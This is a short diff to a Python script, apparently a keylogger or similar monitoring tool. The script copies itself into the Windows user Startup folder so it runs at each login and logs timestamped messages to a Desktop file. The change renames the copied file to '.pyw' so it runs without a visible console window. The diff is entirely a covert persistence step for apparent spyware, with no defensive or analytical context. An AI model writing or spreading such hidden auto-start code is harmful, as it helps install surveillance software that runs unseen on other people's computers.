@@ -6,7 +6,7 @@ from shutil import copyfile
 username = os.getlogin()
 logging_dir = f"C:/Users/{username}/Desktop"
 
-copyfile('main.py', f"C:/Users/{username}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/main.py")
+copyfile('main.py', f"C:/Users/{username}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/main.pyw")
 
 logging.basicConfig(filename=f"{logging_dir}/logfile.txt", level=logging.DEBUG, format="%(asctime)s: %(message)s")
 
